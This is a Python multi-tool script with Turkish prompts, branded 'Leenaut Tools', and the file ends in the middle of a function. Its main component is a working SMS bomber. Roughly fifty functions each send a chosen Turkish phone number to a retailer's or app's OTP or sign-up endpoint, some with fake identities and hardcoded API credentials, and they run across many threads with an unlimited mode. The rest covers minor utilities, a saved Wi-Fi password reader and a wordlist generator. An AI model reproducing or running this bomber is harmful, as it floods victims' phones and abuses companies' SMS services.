import socket
import requests
from googletrans import Translator
import random
import string
from pyfiglet import Figlet
from termcolor import colored
from datetime import datetime
import psutil
import platform
import GPUtil
import pygetwindow as gw
import time
import webbrowser
import subprocess
from collections import Counter
import re
import pyshorteners
from flask import Flask, jsonify



def leenaut_ascii_art():
    f = Figlet(font='slant')
    leenaut_text = f.renderText('Leenaut Tools')
    print(colored(leenaut_text, 'green'))







import subprocess, sys, os

try:
    import requests, urllib3, uuid
except ImportError:
    print("Gerekli modüller indiriliyor...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests==2.28.2", "urllib3==1.26.13", "uuid==1.30"])
finally:
    import concurrent.futures, json, os, random, requests, string, time, urllib, urllib3, uuid

def a101(number):
    try:
        url = "https://www.a101.com.tr/users/otp-login/"
        payload = {
            "phone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "A101"
        else:
            return False, "A101"
    except:
        return False, "A101"

def bim(number):
    try:
        url = "https://bim.veesk.net/service/v1.0/account/login"
        payload = {
            "phone" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BIM"
        else:
            return False, "BIM"
    except:
        return False, "BIM"

def defacto(number):
    try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload = {
            "mobilePhone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["Data"]
        if r1 == "IsSMSSend":
            return True, "Defacto"
        else:
            return False, "Defacto"
    except:
        return False, "Defacto"

def istegelsin(number):
    try:
        url = "https://prod.fasapi.net/"
        payload = {
            "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
            "variables" : {
                "phoneNumber" : f"90{number}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İsteGelsin"
        else:
            return False, "İsteGelsin"
    except:
        return False, "İsteGelsin"

def ikinciyeni(number):
    try:
        url = "https://apigw.ikinciyeni.com/RegisterRequest"
        payload = {
            "accountType": 1,
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
            "isAddPermission": False,
            "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSucceed"]

        if r1 == True:
            return True, "İkinci Yeni"
        else:
            return False, "İkinci Yeni"
    except:
        return False, "İkinci Yeni"

def migros(number):
    try:
        url = "https://www.migros.com.tr/rest/users/login/otp"
        payload = {
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]

        if r1 == True:
            return True, "Migros"
        else:
            return False, "Migros"
    except:
        return False, "Migros"

def ceptesok(number):
    try:
        url = "https://api.ceptesok.com/api/users/sendsms"
        payload = {
            "mobile_number": f"{number}",
            "token_type": "register_token"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Cepte Şok"
        else:
            return False, "Cepte Şok"
    except:
        return False, "Cepte Şok"

def tiklagelsin(number):
    try:
        url = "https://www.tiklagelsin.com/user/graphql"
        payload = {
            "operationName": "GENERATE_OTP",
            "variables": {
                "phone": f"+90{number}",
                "challenge": f"{uuid.uuid4()}",
                "deviceUniqueId": f"web_{uuid.uuid4()}"
            },
            "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tıkla Gelsin"
        else:
            return False, "Tıkla Gelsin"
    except:
        return False, "Tıkla Gelsin"

def bisu(number):
    try:
        url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
        payload = {
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BiSU"
        else:
            return False, "BiSU"
    except:
        return False, "BiSU"

def file(number):
    try:
        url = "https://api.filemarket.com.tr/v1/otp/send"
        payload = {
            "mobilePhoneNumber": f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["data"]
        if r1 == "200 OK":
            return True, "File"
        else:
            return False, "File"
    except:
        return False, "File"

def ipragraz(number):
    try:
        url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
        payload = {
            "otp": "",
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İpragaz"
        else:
            return False, "İpragaz"
    except:
        return False, "İpragaz"

def pisir(number):
    try:
        url = "https://api.pisir.com/v1/login/"
        payload = {"msisdn": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["ok"]
        if r1 == "1":
            return True, "Pişir"
        else:
            return False, "Pişir"
    except:
        return False, "Pişir"

def coffy(number):
    try:
        url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
        payload = {"phoneNumber": f"+90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Coffy"
        else:
            return False, "Coffy"
    except:
        return False, "Coffy"

def sushico(number):
    try:
        url = "https://api.sushico.com.tr/tr/sendActivation"
        payload = {"phone": f"+90{number}", "location": 1, "locale": "tr"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["err"]
        if r1 == 0:
            return True, "SushiCo"
        else:
            return False, "SushiCo"
    except:
        return False, "SushiCo"

def kalmasin(number):
    try:
        url = "https://api.kalmasin.com.tr/user/login"
        payload = {
            "dil": "tr",
            "device_id": "",
            "notification_mobile": "android-notificationid-will-be-added",
            "platform": "android",
            "version": "2.0.6",
            "login_type": 1,
            "telefon": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Kalmasın"
        else:
            return False, "Kalmasın"
    except:
        return False, "Kalmasın"

def yotto(number):
    try:
        url = "https://42577.smartomato.ru/account/session.json"
        payload = {
            "phone" : f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 201:
            return True, "Yotto"
        else:
            return False, "Yotto"
    except:
        return False, "Yotto"

def qumpara(number):
    try:
        url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
        payload = {
            "msisdn" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Qumpara"
        else:
            return False, "Qumpara"
    except:
        return False, "Qumpara"

def aygaz(number):
    try:
        url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
        payload = {
            "Gsm" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Aygaz"
        else:
            return False, "Aygaz"
    except:
        return False, "Aygaz"

def pawapp(number):
    try:
        url = "https://api.pawder.app/api/authentication/sign-up"
        payload = {
            "languageId" : "2",
            "mobileInformation" : "",
            "data" : {
                "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "userAgreement" : "true",
                "kvkk" : "true",
                "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                "phoneNo" : f"{number}",
                "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "PawAPP"
        else:
            return False, "PawAPP"
    except:
        return False, "PawAPP"

def mopas(number):
    try:
        url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
        r = requests.post(url=url, timeout=2)
        
        if r.status_code == 200:
            token = json.loads(r.text)["access_token"]
            token_type = json.loads(r.text)["token_type"]
            url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
            headers = {"authorization": f"{token_type} {token}"}
            r1 = requests.get(url=url, headers=headers, timeout=2)
            
            if r1.status_code == 200:
                return True, "Mopaş"
            else:
                return False, "Mopaş"
        else:
            return False, "Mopaş"
    except:
        return False, "Mopaş"

def paybol(number):
    try:
        url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
        payload = {
            "otp_code" : "null",
            "phone_number" : f"90{number}",
            "reference_id" : "null"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        
        if r.status_code == 200:
            return True, "Paybol"
        else:
            return False, "Paybol"
    except:
        return False, "Paybol"

def ninewest(number):
    try:
        url = "https://www.ninewest.com.tr/webservice/v1/register.json"
        payload = {
            "alertMeWithEMail" : False,
            "alertMeWithSms" : False,
            "dataPermission" : True,
            "email" : "asdafwqww44wt4t4@gmail.com",
            "genderId" : random.randint(0,3),
            "hash" : "5488b0f6de",
            "inviteCode" : "",
            "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
            "phoneNumber" : f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
            "registerContract" : True,
            "registerMethod" : "mail",
            "version" : "3"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        
        if r1 == True:
            return True, "Nine West"
        else:
            return False, "Nine West"
    except:
        return False, "Nine West"

def saka(number):
    try:
        url = "https://mobilcrm2.saka.com.tr/api/customer/login"
        payload = {
            "gsm" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == 1:
            return True, "Saka"
        else:
            return False, "Saka"
    except:
        return False, "Saka"

def superpedestrian(number):
    try:
        url = "https://consumer-auth.linkyour.city/consumer_auth/register"
        payload = {
            "phone_number" : f"+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["detail"]
        if r1 == "Ok":
            return True, "Superpedestrian"
        else:
            return False, "Superpedestrian"
    except:
        return False, "Superpedestrian"

def hayat(number):
    try:
        url = f"https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}"
        r = requests.post(url=url, timeout=5)
        r1 = json.loads(r.text)["IsSuccessful"]
        if r1 == True:
            return True, "Hayat"
        else:
            return False, "Hayat"
    except:
        return False, "Hayat"

def tazi(number):
    try:
        url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
        payload = {
            "cep_tel" : f"{number}",
            "cep_tel_ulkekod" : "90"
        }
        headers = {
            "authorization" : "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tazı"
        else:
            return False, "Tazı"
    except:
        return False, "Tazı"

def gofody(number):
    try:
        url = "https://backend.gofody.com/api/v1/enduser/register/"
        payload = {
            "country_code": "90",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "GoFody"
        else:
            return False, "GoFody"
    except:
        return False, "GoFody"

def weescooter(number):
    try:
        url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
        payload = {
            "tenant": "62a1e7efe74a84ea61f0d588",
            "gsm": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Wee Scooter"
        else:
            return False, "Wee Scooter"
    except:
        return False, "Wee Scooter"

def scooby(number):
    try:
        url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Scooby"
        else:
            return False, "Scooby"
    except:
        return False, "Scooby"

def gez(number):
    try:
        url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["succeeded"]
        if r1 == True:
            return True, "Gez"
        else:
            return False, "Gez"
    except:
        return False, "Gez"

def heyscooter(number):
    try:
        url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}"
        headers = {"user-agent" : "okhttp/3.12.1"}
        r = requests.post(url=url, headers=headers, timeout=5)
        r1 = json.loads(r.text)["IsSuccess"]
        if r1 == True:
            return True, "Hey Scooter"
        else:
            return False, "Hey Scooter"
    except:
        return False, "Hey Scooter"

def jetle(number):
    try:
        url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Jetle"
        else:
            return False, "Jetle"
    except:
        return False, "Jetle"

def rabbit(number):
    try:
        url = "https://api.rbbt.com.tr/v1/auth/authenticate"
        payload = {
            "mobile_number" : f"+90{number}",
            "os_name" : "android",
            "os_version" : "7.1.2",
            "app_version" : " 1.0.2(12)",
            "push_id" : "-"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == True:
            return True, "Rabbit"
        else:
            return False, "Rabbit"
    except:
        return False, "Rabbit"

def roombadi(number):
    try:
        url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
        payload = {"phone": f"{number}", "countryId": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Roombadi"
        else:
            return False, "Roombadi"
    except:
        return False, "Roombadi"

def hizliecza(number):
    try:
        url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
        payload = {"phoneNumber": f"+90{number}", "otpOperationType": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Hızlı Ecza"
        else:
            return False, "Hızlı Ecza"
    except:
        return False, "Hızlı Ecza"

def signalall(number):
    try:
        url = "https://appservices.huzk.com/client/register"
        payload = {
            "name": "",
            "phone": {
                "number": f"{number}",
                "code": "90",
                "country_code": "TR",
                "name": ""
            },
            "countryCallingCode": "+90",
            "countryCode": "TR",
            "approved": True,
            "notifyType": 99,
            "favorites": [],
            "appKey": "live-exchange"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "SignalAll"
        else:
            return False, "SignalAll"
    except:
        return False, "SignalAll"

def goyakit(number):
    try:
        url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["data"]["success"]
        if r1 == True:
            return True, "Go Yakıt"
        else:
            return False, "Go Yakıt"
    except:
        return False, "Go Yakıt"

def pinar(number):
    try:
        url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
        payload = {
            "MobilePhone" : f"{number}"
        }
        headers = {
            "devicetype" : "android",
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.text == True:
            return True, "Pınar"
        else:
            return False, "Pınar"
    except:
        return False, "Pınar"

def oliz(number):
    try:
        url = "https://api.oliz.com.tr/api/otp/send"
        payload = {
            "mobile_number" : f"{number}",
            "type" : None
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["meta"]["messages"]["success"][0]
        if r1 == "SUCCESS_SEND_SMS":
            return True, "Oliz"
        else:
            return False, "Oliz"
    except:
        return False, "Oliz"

def macrocenter(number):
    try:
        url = f"https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}"
        payload = {
            "phoneNumber" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]
        if r1 == True:
            return True, "Macro Center"
        else:
            return False, "Macro Center"
    except:
        return False, "Macro Center"

def marti(number):
    try:
        url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
        payload = {
            "mobilePhone" : f"{number}",
            "mobilePhoneCountryCode" : "90"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Martı"
        else:
            return False, "Martı"
    except:
        return False, "Martı"

def karma(number):
    try:
        url = "https://api.gokarma.app/v1/auth/send-sms"
        payload = {
            "phoneNumber" : f"90{number}",
            "type" : "REGISTER",
            "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
            "language" : "tr-TR"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Karma"
        else:
            return False, "Karma"
    except:
        return False, "Karma"

def joker(number):
    try:
        url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
        payload = {
            "phone" : f"{number}"
        }
        headers = {
            "user-agent" : ""
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        r1 = json.loads(r.text)["success"]

        if r1 == True:
            return True, "Joker"
        else:
            return False, "Joker"
    except:
        return False, "Joker"

def hop(number):
    try:
        url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
        payload = {
            "phone" : f"+90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Hop"
        else:
            return False, "Hop"
    except:
        return False, "Hop"

def kimgbister(number):
    try:
        url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
        payload = {
            "msisdn" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Kim GB Ister"
        else:
            return False, "Kim GB Ister"
    except:
        return False, "Kim GB Ister"

def anadolu(number):
    try:
        url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
        payload = urllib.parse.urlencode({
            "Numara": f"{str(number)[0:3]}{str(number)[3:6]}{str(number)[6:8]}{str(number)[8:10]}"
        })
        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        if r.status_code == 200:
            return True, "Anadolu"
        else:
            return False, "Anadolu"
    except:
        return False, "Anadolu"

def total(number):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    try:
        url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}"
        r = requests.post(url=url, verify=False, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Total"
        else:
            return False, "Total"
    except:
        return False, "Total"

def englishhome(number):
    try:
        url = "https://www.englishhome.com:443/enh_app/users/registration/"
        payload = {
            "first_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "last_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
            "phone": f"0{number}",
            "password": f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
            "email_allowed": False,
            "sms_allowed": False,
            "confirm": True,
            "tom_pay_allowed": True
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 202:
            return True, "English Home"
        else:
            return False, "English Home"
    except:
        return False, "English Home"

def petrolofisi(number):
    try:
        url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
        payload = {
            "approvedContractVersion": "v1",
            "approvedKvkkVersion": "v1",
            "contractPermission": True,
            "deviceId": "",
            "etkContactPermission": True,
            "kvkkPermission": True,
            "mobilePhone": f"0{number}",
            "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
            "positiveCard": "",
            "referenceCode": "",
            "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
        }
        headers = {
            "X-Channel": "IOS"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 204:
            return True, "Petrol Ofisi"
        else:
            return False, "Petrol Ofisi"
    except:
        return False, "Petrol Ofisi"

def send_service(number, service):
    global all_sends
    global success_sends
    global failed_sends
    result = service(number=number)
    if result[0] == True:
        all_sends += 1
        success_sends += 1
        print(f"[+] {all_sends} {result[1]}")
    else:
        all_sends += 1
        failed_sends += 1
        print(f"[-] {all_sends} {result[1]}")

def send(number, amount, worker_amount):
    global clear
    global all_sends
    global success_sends
    global failed_sends
    start_time = int(time.perf_counter())
    functions = [a101, anadolu, aygaz, bim, bisu, ceptesok, coffy, defacto, englishhome, file, gez, gofody, goyakit, hayat, heyscooter, hizliecza, hop, ikinciyeni, ipragraz, istegelsin, jetle, joker, kalmasin, karma, kimgbister, macrocenter, marti, migros, mopas, ninewest, oliz, pawapp, paybol, petrolofisi, pinar, pisir, qumpara, rabbit, roombadi, saka, scooby, signalall, superpedestrian, sushico, tazi, tiklagelsin, total, weescooter, yotto]
    random.shuffle(functions)
    clear()
    print(f"{number} numarasına SMS gönderimi başlatıldı!\n")
    if amount == 0:
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            i = 0
            while True:
                executor.submit(send_service, number, functions[i % 49])
                i += 1
                if i == len(functions):
                    i = 0
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            for i in range(amount):
                executor.submit(send_service, number, functions[i % 49])
    print("\nGönderim tamamlandı!")
    print(f"{all_sends} SMS, {int(time.perf_counter()) - start_time} saniye içerisinde gönderildi. {success_sends} başarılı, {failed_sends} başarısız.\n")
    all_sends = 0
    success_sends = 0
    failed_sends = 0
    restart()

def watermark():
    print("Leenaut ig:deniz.erdrnn")

def get_number():
    global clear
    while True:
        try:
            number = int(input(f"""Telefon numarasını yazın. Şunun gibi: "54xxxxxxxx" (Sadece Türkiye numaralarında çalışır!)\n[?] : """))
            if len(str(number)) == 10 and str(number)[0] == "5":
                return number
            else:
                clear()
                print(f"Numara Yanlış. Lütfen geçerli bir numara girin.")
        except:
            clear()
            print(f"Lütfen bir numara yazın.")

def get_amount():
    global clear
    while True:
        try:
            amount = int(input(f"""Kaç SMS gönderilsin? Sınırsız gönderim için "0" basın.\n[?] : """))
            if amount >= 0:
                return amount
            else:
                clear()
                print(f"Girilen sayı 0'dan küçük olamaz.")
        except:
            clear()
            print(f"Lütfen bir sayı girin.")

def get_worker_amount():
    global clear
    while True:
        try:
            worker_amount = int(input(f"Thread sayısını girin. Tavsiye edilen 5-100 arasıdır.\n[?] : "))
            if worker_amount >= 1:
                return worker_amount
            else:
                clear()
                print(f"Girilen sayı 1'den küçük olamaz.")
        except:
            clear()
            print(f"Lütfen bir sayı girin.")

def restart():
    global clear
    while True:
        question = input(f"Programdan çıkılsın mı?\n[Y/N] : ").upper().replace(" ", "")
        if question == "Y":
            clear()
            break  #
        elif question == "N":
            clear()
            start()
            break
        else:
            clear()
            print(f"Yanlış tuşa basıldı!")

def start():
    global clear
    clear()
    watermark()
    number = get_number()
    amount = get_amount()
    worker_amount = get_worker_amount()
    send(number=number, amount=amount, worker_amount=worker_amount)

all_sends = 0
success_sends = 0
failed_sends = 0
clear = lambda: os.system("cls")




    
    



    




import random
import time

def hizli_yazma_testi():
    kelimeler = [
    "python", "programlama", "hızlı", "yazma", "testi", 
    "gelişim", "uygulama", "öğrenme", "deneme",
    "örnek", "kod", "geliştirici", "proje", "sürdürülebilir",
    "veri", "analiz", "web", "tasarım", "algoritma", "leenaut", "sosyal"
    "döner", "talisca", "fen", "kolestrol", "soğukkanlı", "yok", "Beşiktaş"
    "buraya", "kadar", "geldiysen", "helal", "olsun", "instagram", "var"
]

    input("1 Dakikalık Hızlı yazma testine başlamak için ENTER tuşuna basın...")
    baslangic_zamani = time.time()
    bitis_zamani = baslangic_zamani + 60  # 1 dakika süre

    dogru_sayisi = 0
    yanlis_sayisi = 0
    toplam_karakter = 0

    while time.time() < bitis_zamani:
        kelime = random.choice(kelimeler)
        print(f"\nYazılacak Kelime: {kelime}")
        girilen_kelime = input("Yukarıdaki kelimeyi hızlı bir şekilde yazın: ")

        toplam_karakter += len(kelime)

        if girilen_kelime == kelime:
            dogru_sayisi += 1
        else:
            yanlis_sayisi += 1
            print("Yanlış! Doğru kelimeyi yazın.")

    sure = 60  # 1 dakika

    hiz = toplam_karakter / sure  # Dakika başına hız
    dogruluk_orani = (dogru_sayisi / (dogru_sayisi + yanlis_sayisi)) * 100

    print("\n--- Sonuçlar ---")
    print(f"Geçen Süre: {sure} saniye")
    print(f"Hızınız: {hiz:.2f} karakter/dakika")
    print(f"Doğruluk Oranı: {dogruluk_orani:.2f}%")
    print(f"Doğru Kelime Sayısı: {dogru_sayisi}")
    print(f"Yanlış Kelime Sayısı: {yanlis_sayisi}")



def e_okul_ortalama_hesapla():
    ders_sayisi = int(input("Kaç adet dersiniz var? "))

    toplam_notlar = 0
    toplam_not_adedi = 0

    for i in range(ders_sayisi):
        ders_adi = input(f"{i + 1}. Ders adını girin: ")
        sinav_sayisi = int(input(f"{ders_adi} dersi için kaç adet sınav notunuz var? "))

        for j in range(sinav_sayisi):
            notu = float(input(f"{ders_adi} dersi {j + 1}. sınav notunuzu girin: "))
            toplam_notlar += notu
            toplam_not_adedi += 1

            print(f"{ders_adi} Dersi {j + 1}. Sınav Notu: {notu}")

    ortalama = toplam_notlar / toplam_not_adedi
    print(f"\nGenel Ortalama: {ortalama:.2f}")






import requests



import webbrowser

def pixlay_games_siteye_git():
    pixlay_site_linki = "http://pixlay.com.tr"
    webbrowser.open(pixlay_site_linki)
    print("PixLay Games sitesine yönlendiriliyorsunuz...")






def wifi_sifresi_goster():
    try:
        wifi_adaptor = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces']).decode('utf-8')
        if "SSID" in wifi_adaptor:
            wifi_adi = input("Wi-Fi ağ adını girin: ")
            sifre = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name="{wifi_adi}"', 'key=clear']).decode('utf-8')
            if "Key Content" in sifre:
                start_index = sifre.index("Key Content") + len("Key Content") + 1
                end_index = sifre.index("Cost settings")
                wifi_sifresi = sifre[start_index:end_index].strip()
                print(f"{wifi_adi} Wi-Fi ağının şifresi: {wifi_sifresi}")
            else:
                print(f"{wifi_adi} Wi-Fi ağının şifresi bulunamadı.")
        else:
            print("Wi-Fi ağına bağlı değilsiniz.")
    except Exception as e:
        print(f"Wi-Fi şifresi alınırken bir hata oluştu: {e}")






        from collections import Counter


def metin_analiz_araci():
    # Kullanıcıdan metin girişi al
    metin = input("Lütfen analiz etmek istediğiniz metni girin: ")

    # Kelime sayısını ve karakter sayısını hesapla
    kelime_sayisi = len(re.findall(r'\b\w+\b', metin))
    karakter_sayisi = len(metin)

    print(f"\nMetindeki Kelime Sayısı: {kelime_sayisi}")
    print(f"Metindeki Karakter Sayısı: {karakter_sayisi}")

    # En sık geçen kelimeleri bul
    kelimeler = re.findall(r'\b\w+\b', metin.lower())
    en_sik_gecen_kelimeler = Counter(kelimeler).most_common(5)

    print("\nEn Sık Geçen 5 Kelime:")
    for kelime, sayi in en_sik_gecen_kelimeler:
        print(f"{kelime}: {sayi} kez")






        

def url_kisaltma_menu():
    try:
        # Kullanıcıdan URL al
        uzun_url = input("Kısaltmak istediğiniz URL'yi girin: ")

        # URL'yi kısalt
        s = pyshorteners.Shortener()
        kisalmis_url = s.tinyurl.short(uzun_url)

        # Kullanıcıya kısaltılmış URL'i göster
        print("\nKısaltılmış URL:", kisalmis_url)

    except Exception as e:
        print(f"\nHata oluştu: {e}")





  

def instagrama_git():
    instagram_profil_linki = "https://instagram.com/deniz.erdrnn"
    webbrowser.open(instagram_profil_linki)
    print("Instagram profil sayfasına yönlendiriliyorsunuz...")



    




def canli_tarih_ve_saat():
    tarih_saat = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    print(f"Aktüel Tarih ve Saat: {tarih_saat}")

# canli_tarih_ve_saat fonksiyonunu bir kere çağırın
canli_tarih_ve_saat()





def buyuk_kucuk_harf_cevir():
    metin = input("Bir metin girin: ")
    cevirilmis_metin = ""

    for karakter in metin:
        if karakter.isalpha():
            if karakter.islower():
                cevirilmis_metin += karakter.upper()
            else:
                cevirilmis_metin += karakter.lower()
        else:
            cevirilmis_metin += karakter

    print(f"Çevrilmiş Metin: {cevirilmis_metin}")




def wordlist_olustur(uzunluk, adet, dosya_adı):
    try:
        with open(dosya_adı, 'w') as dosya:
            for _ in range(adet):
                kelime = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(uzunluk))
                dosya.write(f"{kelime}\n")
        print(f"Wordlist başarıyla oluşturuldu: {dosya_adı}")
    except Exception as e:
        print(f"Wordlist oluşturulurken bir hata oluştu: {e}")


def get_external_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        ip_data = response.json()
        external_ip = ip_data['ip']
        print(f"Bilgisayarın Dış IP Adresi: {external_ip}")
    except Exception as e:
        print(f"IP adresi alınırken bir hata oluştu: {e}")


def get_local_ip():
